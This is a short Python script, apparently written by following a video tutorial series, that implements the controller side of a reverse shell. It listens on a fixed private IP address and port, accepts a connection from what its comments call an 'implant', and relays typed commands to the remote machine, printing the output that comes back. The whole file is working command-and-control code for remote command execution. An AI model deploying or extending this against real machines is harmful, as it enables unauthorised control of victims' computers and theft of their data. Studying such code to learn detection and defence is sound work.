#!/usr/bin/python3

#ref https://www.youtube.com/watch?v=Iu8_IpztiOU&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF&index=16

import socket
import sys

PORT = 9999
SERVER = "192.168.92.128"
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
BACKLOG = 5

# Creates a socket.
def create_socket():
    try:
        global svr_socket
        # Creates socket.
        svr_socket = socket.socket()
    except socket.error as msg:
        print(f"Socket creation error: {msg}.\n")

# Binding the socket and listening for connections.
def bind_socket():
    try:
        global svr_socket

        print(f"Binding port: {PORT}.\n")

        svr_socket.bind(ADDR)
        svr_socket.listen(BACKLOG)
    except socket.error as msg:
        print(f"Socket binding error {msg}.\n Retrying...")
        # If socket bind fails, recursively call bind_socket()
        bind_socket()

# Establish connection with a client (socket must be listening)

def socket_accept():
    # Socket object stored in connect.
    # Address pair (hostaddr, port) stored in address.
    conn, addr = svr_socket.accept()
    print(f"Connection has been established! IP: {addr[0]} Port: {addr[1]}")
    send_commands(conn)
    conn.close()

# Send commands to implant.
def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                # Close client socket.
                conn.close()
                # Close server socket.
                svr_socket.close
                # Closes terminal.
                sys.exit()
            # Encode the command into byte format.
            # Obtain the length of the encoded string.
            # If the length is < 0, then we know the user has typed something
            # in.
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                # Set recv buffer to 1024, decode byte to UTF-8, which then allows
                # us to convert the response into a string with str.
                client_response = str(conn.recv(1024), "utf-8")
                # End="" ensures that when typing a command, the terminal goes to
                # to the next line. Otherwise, input stacks up on the same line.
                print(client_response, end="")
        except:
            print("Error sending commands")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()